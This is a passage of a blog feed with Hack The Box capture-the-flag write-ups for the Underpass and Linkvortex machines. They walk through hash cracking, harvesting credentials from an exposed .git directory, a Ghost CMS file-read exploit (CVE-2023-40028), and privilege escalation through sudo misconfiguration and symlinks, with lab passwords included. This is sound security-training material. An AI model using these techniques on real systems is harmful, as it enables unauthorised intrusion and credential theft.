<p>i went to &#x2F;app&#x2F;operators and i tried to access it with the last<br>Username:Password we had and its works we went to management and<br>list users and we find a hashed password so lets try to decode it<br>with crackstation or u can use john the ripper.<br>(type:MD5) 412DD4759978ACFCC81DEAB01B382403:underwaterfriends and lets try<br>to ssh with the username:password we got (btw : the username is svcMosh) </p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ ssh svcMosh@10.10.11.48</span><br><span class="line"><span class="comment"># and enter the password : underwaterfriends</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>IT WORKS, now we are inside the target machine<br>so u can read the user.flag </p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">svcMosh@underpass:~$ <span class="built_in">cat</span> user.txt</span><br><span class="line">60a620dd37a894c9b.... <span class="comment"># U got this mate </span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">svcMosh@underpass:~$ <span class="built_in">sudo</span> -l</span><br><span class="line"> Matching Defaults entries <span class="keyword">for</span> svcMosh on localhost:</span><br><span class="line">   env_reset, mail_badpass,</span><br><span class="line">   secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty</span><br><span class="line"></span><br><span class="line"> User svcMosh may run the following commands on localhost:</span><br><span class="line">   (ALL) NOPASSWD: /usr/bin/mosh-server</span><br></pre></td></tr></table></figure>
<p>after some searching on google or u can read its manual </p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">svcMosh@underpass:~<span class="variable">$mosh</span></span><br><span class="line">Usage: /usr/bin/mosh [options] [--] [user@]host [<span class="built_in">command</span>...]</span><br><span class="line">      --client=PATH        mosh client on <span class="built_in">local</span> machine</span><br><span class="line">                              (default: <span class="string">&quot;mosh-client&quot;</span>)</span><br><span class="line">      --server=COMMAND     mosh server on remote machine <span class="comment"># interesting </span></span><br><span class="line">                              (default: <span class="string">&quot;mosh-server&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>And we are the root , we can read the root file and get this done </p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">svcMosh@underpass:~$ mosh --server=<span class="string">&quot;sudo /usr/bin/mosh-server&quot;</span> localhost</span><br><span class="line"></span><br><span class="line">root@underpass:~# <span class="built_in">cat</span> /root/root.txt <span class="comment">#we are the root </span></span><br><span class="line"> 882f2654c3c9... <span class="comment">#try to find it </span></span><br></pre></td></tr></table></figure>

<pre><code>                          CONGRATULATION 
</code></pre>
<p>Summary :</p>
<p>for me , its my first time scanning UDP ports , and enumerate SNMP  so it was<br>a good experience. we learn that we need to brute force some directories<br>more and more until we find something that lead us to the target .<br>Also for the Privesca , it was good to learn about “mosh” command<br>and what used for and a Misconfiguration can lead to a root privileges.</p>
<div style="margin-top: 20px;">
  <button id="likeButton" onclick="incrementLikes()" style="background-color: #4CAF50; color: white; border: none; padding: 10px 20px; text-align: center; text-decoration: none; display: inline-block; font-size: 16px; margin: 4px 2px; cursor: pointer; border-radius: 12px;">Like</button>
    <span id="likeCount" style="font-size: 16px;">0</span> 👍  I HOPE U LIKE THIS WRITE-UP
</div>

<script>
  let likeCount = 0;
  function incrementLikes() {
    likeCount++;
    document.getElementById('likeCount').innerText = likeCount;
    document.getElementById('likeButton').disabled = true;
    document.getElementById('likeButton').innerText = 'Liked';
    document.getElementById('likeButton').style.backgroundColor = '#888';
  }
</script>]]></content>
      <categories>
        <category>ACTIVE MACHINE</category>
        <category>HACK THE BOX</category>
        <category>LINUX</category>
      </categories>
  </entry>
  <entry>
    <title>Linkvortex</title>
    <url>/linkvortex/</url>
    <content><![CDATA[<h2 id="Table-of-Contents"><a href="#Table-of-Contents" class="headerlink" title="Table of Contents"></a>Table of Contents</h2><ol>
<li><a href="#initial-enumeration-with-nmap">Initial Enumeration with Nmap</a></li>
<li><a href="#step-2-enumeration-of-http-service">Step 2: Enumeration of HTTP Service</a></li>
<li><a href="#step-3-subdomain-enumeration">Step 3: Subdomain Enumeration</a></li>
<li><a href="#step-4-enumerating-devlinkvortexhtb">Step 4: Enumerating dev.linkvortex.htb</a></li>
<li><a href="#step-5-exploiting-the-login-page">Step 5: Exploiting the Login Page</a></li>
<li><a href="#step-6-ssh-access">Step 6: SSH Access</a></li>
<li><a href="#step-7-privilege-escalation">Step 7: Privilege Escalation</a></li>
</ol>
<p>In this write-up, we will walk through the steps to hack the Linkvortex machine on Hack The Box. Let’s dive in!</p>
<h2 id="Initial-Enumeration-with-Nmap"><a href="#Initial-Enumeration-with-Nmap" class="headerlink" title="Initial Enumeration with Nmap"></a>Initial Enumeration with Nmap</h2><p> We start by scanning the target machine for open ports using Nmap:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ nmap -sV 10.10.11.47 </span><br><span class="line">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-27 07:01 EST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> linkvortex.htb (10.10.11.47)</span><br><span class="line">Host is up (0.064s latency).</span><br><span class="line">Not shown: 998 closed tcp ports (reset)</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">80/tcp open  http    Apache httpd</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 8.11 seconds</span><br></pre></td></tr></table></figure>
<p>We find two open ports:</p>
<ul>
  <li><strong>Port 22</strong>: SSH (OpenSSH 8.9p1)</li>
  <li><strong>Port 80</strong>: HTTP (Apache)</li>
</ul>

<h2 id="Step-2-Enumeration-of-HTTP-Service"><a href="#Step-2-Enumeration-of-HTTP-Service" class="headerlink" title="Step 2: Enumeration of HTTP Service"></a>Step 2: Enumeration of HTTP Service</h2><p>We proceed to brute-force directories using Dirsearch:</p>
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ dirsearch -u http://linkvortex.htb/ -x 404</span><br><span class="line"></span><br><span class="line"> [07:05:48] 200 -  103B  - /robots.txt</span><br><span class="line"> [07:05:51] 200 -  256B  - /sitemap.xml</span><br><span class="line"> [07:05:49] 403 -  199B  - /server-status                                   </span><br><span class="line">                                                                             </span><br><span class="line">Task Completed  </span><br></pre></td></tr></table></figure>
<p>The &#x2F;robots.txt file reveals the following:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Disallow: /ghost/</span><br></pre></td></tr></table></figure>
<p>This indicates a potential login page at &#x2F;ghost&#x2F;.</p>
<h2 id="Step-3-Subdomain-Enumeration"><a href="#Step-3-Subdomain-Enumeration" class="headerlink" title="Step 3: Subdomain Enumeration"></a>Step 3: Subdomain Enumeration</h2><p>Using FFUF, we enumerate subdomains:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ ffuf -u http://linkvortex.htb/ -w SecLists/Discovery/DNS/subdomains-top1million-5000.txt -H <span class="string">&quot;Host:FUZZ.linkvortex.htb&quot;</span> -mc 200</span><br><span class="line"></span><br><span class="line"> dev                     [ Status: 200, Size: 2538, Words: 670, Lines: 116]</span><br></pre></td></tr></table></figure>
<p>We discover a subdomain dev.linkvortex.htb. Adding this to our &#x2F;etc&#x2F;hosts file allows us to access it. </p>
<h2 id="Step-4-Enumerating-dev-linkvortex-htb"><a href="#Step-4-Enumerating-dev-linkvortex-htb" class="headerlink" title="Step 4: Enumerating dev.linkvortex.htb"></a>Step 4: Enumerating dev.linkvortex.htb</h2><p>We run Dirsearch again on the subdomain:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$  dirsearch -u dev.linkvortex.htb</span><br><span class="line">/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html</span><br><span class="line">  from pkg_resources import DistributionNotFound, VersionConflict</span><br><span class="line"></span><br><span class="line">Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460</span><br><span class="line"></span><br><span class="line">Output File: /home/kali/reports/_dev.linkvortex.htb/_24-12-27_07-25-41.txt</span><br><span class="line"></span><br><span class="line">Target: http://dev.linkvortex.htb/</span><br><span class="line"></span><br><span class="line"> [07:25:41] Starting:                                                                                                                              </span><br><span class="line"> [07:25:43] 200 -   73B  - /.git/description                                 </span><br><span class="line"> [07:25:43] 200 -  201B  - /.git/config                                      </span><br><span class="line"> [07:25:43] 200 -  620B  - /.git/hooks/</span><br><span class="line"> [07:25:43] 200 -  557B  - /.git/                                            </span><br><span class="line"> [07:25:43] 200 -   41B  - /.git/HEAD</span><br><span class="line"> [07:25:43] 301 -  239B  - /.git  -&gt;  http://dev.linkvortex.htb/.git/        </span><br><span class="line"> [07:25:43] 200 -  402B  - /.git/info/                                       </span><br><span class="line"> [07:25:43] 200 -  401B  - /.git/logs/</span><br><span class="line"> [07:25:43] 200 -  175B  - /.git/logs/HEAD                                   </span><br><span class="line"> [07:25:43] 200 -  240B  - /.git/info/exclude                                </span><br><span class="line"> [07:25:44] 200 -  393B  - /.git/refs/                                       </span><br><span class="line"> [07:25:44] 200 -  418B  - /.git/objects/</span><br><span class="line"> [07:25:44] 200 -  147B  - /.git/packed-refs                                 </span><br><span class="line"> [07:25:44] 301 -  249B  - /.git/refs/tags  -&gt;  http://dev.linkvortex.htb/.git/refs/tags/</span><br><span class="line"> [07:25:44] 200 -  691KB - /.git/index                                       </span><br><span class="line"> [07:25:44] 403 -  199B  - /.ht_wsr.txt                                      </span><br><span class="line"> [07:25:44] 403 -  199B  - /.htaccess.bak1                                   </span><br><span class="line"> [07:25:44] 403 -  199B  - /.htaccess.orig                                   </span><br><span class="line"> [07:25:44] 403 -  199B  - /.htaccess.sample                                 </span><br><span class="line"> [07:25:44] 403 -  199B  - /.htaccess_extra                                  </span><br><span class="line"> [07:25:44] 403 -  199B  - /.htaccessBAK</span><br><span class="line"> [07:25:44] 403 -  199B  - /.htaccessOLD2</span><br><span class="line"> [07:25:44] 403 -  199B  - /.htaccess.save                                   </span><br><span class="line"> [07:25:44] 403 -  199B  - /.htm</span><br><span class="line"> [07:25:44] 403 -  199B  - /.htaccess_sc</span><br><span class="line"> [07:25:44] 403 -  199B  - /.htaccess_orig</span><br><span class="line"> [07:25:44] 403 -  199B  - /.htaccessOLD                                     </span><br><span class="line"> [07:25:44] 403 -  199B  - /.html</span><br><span class="line"> [07:25:44] 403 -  199B  - /.htpasswd_test                                   </span><br><span class="line"> [07:25:44] 403 -  199B  - /.htpasswds                                       </span><br><span class="line"> [07:25:44] 403 -  199B  - /.httr-oauth</span><br><span class="line"> [07:26:03] 403 -  199B  - /cgi-bin/                                         </span><br><span class="line"> [07:26:30] 403 -  199B  - /server-status/                                   </span><br><span class="line"> [07:26:30] 403 -  199B  - /server-status                                    </span><br><span class="line"> Task Completed</span><br></pre></td></tr></table></figure>
<p>The presence of the .git directory suggests potential sensitive information.<br> We use GitHack to extract its contents:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ python Githack.py http://dev.linkvortex.htb/.git/</span><br><span class="line"> </span><br></pre></td></tr></table></figure>
<p>The extracted files include authentication.test.js, which contains hardcoded<br>credentials:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">const password = <span class="string">&#x27;OctopiFociPilfer45&#x27;</span>;</span><br></pre></td></tr></table></figure>
<h2 id="Step-5-Exploiting-the-Login-Page"><a href="#Step-5-Exploiting-the-Login-Page" class="headerlink" title="Step 5: Exploiting the Login Page"></a>Step 5: Exploiting the Login Page</h2><p>We use the credentials to log in to &#x2F;ghost&#x2F;:</p>
<ul>
  <li><strong>Username</strong>: admin@linkvortex.htb</li>
  <li><strong>Password</strong>: OctopiFociPilfer45</li>
</ul>


<p>After logging in, we find the machine is running a vulnerable version of Ghost CMS.<br>We exploit CVE-2023-40028 to read arbitrary files:<br>BTW: after downloading the CVE change the URL from the host the </p>
<p> http://linkvortex.htb </p>
 read the config file that we found in dockerfile.ghost

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ bash CVE-2023-40028 -u admin@linkvortex.htb -p OctopiFociPilfer45</span><br><span class="line"> WELCOME TO THE CVE-2023-40028 SHELL</span><br><span class="line"> file&gt; /var/lib/ghost/config.production.json</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>The exploit reveals the following:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"><span class="string">&quot;url&quot;</span>: <span class="string">&quot;http://localhost:2368&quot;</span>,</span><br><span class="line"><span class="string">&quot;server&quot;</span>: &#123;</span><br><span class="line">  <span class="string">&quot;port&quot;</span>: 2368,</span><br><span class="line">  <span class="string">&quot;host&quot;</span>: <span class="string">&quot;::&quot;</span></span><br><span class="line">&#125;,&#123;</span><br><span class="line"><span class="string">&quot;mail&quot;</span>: &#123;</span><br><span class="line">  <span class="string">&quot;transport&quot;</span>: <span class="string">&quot;Direct&quot;</span></span><br><span class="line">&#125;,&#123;</span><br><span class="line"><span class="string">&quot;logging&quot;</span>: &#123;</span><br><span class="line">  <span class="string">&quot;transports&quot;</span>: [<span class="string">&quot;stdout&quot;</span>]</span><br><span class="line">&#125;,&#123;</span><br><span class="line"><span class="string">&quot;process&quot;</span>: <span class="string">&quot;systemd&quot;</span>,</span><br><span class="line"><span class="string">&quot;paths&quot;</span>: &#123;</span><br><span class="line">  <span class="string">&quot;contentPath&quot;</span>: <span class="string">&quot;/var/lib/ghost/content&quot;</span></span><br><span class="line">&#125;,&#123;</span><br><span class="line"><span class="string">&quot;spam&quot;</span>: &#123;</span><br><span class="line">  <span class="string">&quot;user_login&quot;</span>: &#123;</span><br><span class="line">      <span class="string">&quot;minWait&quot;</span>: 1,</span><br><span class="line">      <span class="string">&quot;maxWait&quot;</span>: 604800000,</span><br><span class="line">      <span class="string">&quot;freeRetries&quot;</span>: 5000</span><br><span class="line">  &#125;,&#123;</span><br><span class="line"><span class="string">&quot;mail&quot;</span>: &#123;</span><br><span class="line">   <span class="string">&quot;transport&quot;</span>: <span class="string">&quot;SMTP&quot;</span>,</span><br><span class="line">   <span class="string">&quot;options&quot;</span>: &#123;</span><br><span class="line">    <span class="string">&quot;service&quot;</span>: <span class="string">&quot;Google&quot;</span>,</span><br><span class="line">    <span class="string">&quot;host&quot;</span>: <span class="string">&quot;linkvortex.htb&quot;</span>,</span><br><span class="line">    <span class="string">&quot;port&quot;</span>: 587,</span><br><span class="line">    <span class="string">&quot;auth&quot;</span>: &#123;</span><br><span class="line">      <span class="string">&quot;user&quot;</span>: <span class="string">&quot;bob@linkvortex.htb&quot;</span>,</span><br><span class="line">      <span class="string">&quot;pass&quot;</span>: <span class="string">&quot;fibber-talented-worth&quot;</span></span><br><span class="line">      </span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>Finally i try soo many time to get that i thought the CVE isnt working but idk somehow it works<br>so we got the password and the username.<br>Using the credentials:</p>
<ul>
  <li><strong>Username</strong>: bob@linkvortex.htb</li>
  <li><strong>Password</strong>: fibber-talented-worth</li>
</ul>


<h2 id="Step-6-SSH-Access"><a href="#Step-6-SSH-Access" class="headerlink" title="Step 6: SSH Access"></a>Step 6: SSH Access</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ ssh bob@linkvortex.htb</span><br><span class="line"> <span class="comment"># bob@linkvortex.htb&#x27;s password: fibber-talented-worth</span></span><br><span class="line"></span><br><span class="line">$ bob@linkvortex:~$ <span class="built_in">cat</span> user.txt</span><br><span class="line">a6acafe1314c70.... <span class="comment"># u can do it </span></span><br></pre></td></tr></table></figure>

<h2 id="Step-7-Privilege-Escalation"><a href="#Step-7-Privilege-Escalation" class="headerlink" title="Step 7: Privilege Escalation"></a>Step 7: Privilege Escalation</h2><p>We check Bob’s sudo privileges:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ bob@linkvortex:~$ <span class="built_in">sudo</span> -l </span><br><span class="line"> Matching Defaults entries <span class="keyword">for</span> bob on linkvortex:</span><br><span class="line">    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty,</span><br><span class="line">    env_keep+=CHECK_CONTENT</span><br><span class="line"></span><br><span class="line"> User bob may run the following commands on linkvortex:</span><br><span class="line">    (ALL) NOPASSWD: /usr/bin/bash /opt/ghost/clean_symlink.sh *.png</span><br></pre></td></tr></table></figure>
<p>after reading the code of the clean_symlink.sh , The script allows us to use symbolic links to read files.<br> We exploit it to read &#x2F;root&#x2F;root.txt:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">bob@linkvortex:~$ <span class="built_in">ln</span> -s /root/root.txt nutzh.txt <span class="comment">#so we create a link between nutzh and root.txt</span></span><br><span class="line">bob@linkvortex:~$ <span class="built_in">ln</span> -s /home/bob/nutzh.txt bob.png <span class="comment"># look the clean_symlink code he can read through the image files</span></span><br><span class="line">bob@linkvortex:~$ <span class="built_in">sudo</span> CHECK_CONTENT=<span class="literal">true</span> /usr/bin/bash /opt/ghost/clean_symlink.sh /home/bob/bob.png</span><br><span class="line"> Link found [ /home/bob/bob.png ] , moving it to quarantine</span><br><span class="line"> Content:</span><br><span class="line"> c2f05024dc11bbd7dad.... <span class="comment">#u got this mate</span></span><br></pre></td></tr></table></figure>
<p> CONCLUSION : </p>
<p>Key Takeaways:</p>
<p>Use enumeration tools like Dirsearch, FFUF, and GitHack to uncover hidden resources.</p>
<p>Exploit known vulnerabilities (e.g., CVE-2023-40028) for information disclosure.</p>
<p>Understand symlink exploitation to escalate privileges.</p>
<pre><code> Congratulations! You&#39;ve rooted the Linkvortex machine. 🎉
</code></pre>
<div style="margin-top: 20px;">
  <button id="likeButton" onclick="incrementLikes()" style="background-color: #4CAF50; color: white; border: none; padding: 10px 20px; text-align: center; text-decoration: none; display: inline-block; font-size: 16px; margin: 4px 2px; cursor: pointer; border-radius: 12px;">Like</button>
    <span id="likeCount" style="font-size: 16px;">0</span> 👍  I HOPE U LIKE THIS WRITE-UP
</div>

<script>
  let likeCount = 0;
  function incrementLikes() {
    likeCount++;
    document.getElementById('likeCount').innerText = likeCount;
    document.getElementById('likeButton').disabled = true;
    document.getElementById('likeButton').innerText = 'Liked';
    document.getElementById('likeButton').style.backgroundColor = '#888';
  }
</script>

]]></content>
      <categories>
        <category>ACTIVE MACHINE</category>
      </categories>
      <tags>
        <tag>HACK THE BOX</tag>
        <tag>LINUX</tag>
        <tag>CTF</tag>
        <tag>PENETRATION TESTING</tag>
      </tags>
  </entry>
</search>
